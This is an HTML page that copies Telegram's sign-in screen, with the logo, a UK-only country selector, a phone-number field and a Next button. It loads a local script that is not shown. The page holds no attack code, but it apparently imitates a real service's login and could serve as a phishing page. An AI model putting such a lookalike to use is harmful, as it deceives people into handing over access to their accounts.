<!DOCTYPE html> 
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Login Section -->
    <div class="login-container" id="loginContainer">
        <img id="telegramLogo" src="telegram-logo.png" alt="Telegram Logo" class="logo">
        <h2>Sign in to Telegram</h2>
        <p>Please confirm your country code and enter your phone number.</p>
        <form id="phoneForm">
            <div class="input-container">
                <div class="input-label">Country</div>
                <select id="country" name="country">
                    <option value="GB">United Kingdom (+44)</option>
                </select>
            </div>
            <div class="input-container">
                <div class="input-label">Phone Number</div>
                <input 
                    type="tel" 
                    id="phoneNumber" 
                    name="phoneNumber"
                    placeholder="+44 ----- ------"
                    pattern="\+?[0-9]+" 
                    required
                />
            </div>
            <button type="submit" id="submitPhoneNumber">Next</button>
        </form>
        <div id="message"></div>
    </div>

    <script src="/script.js"></script>
</body>
</html>
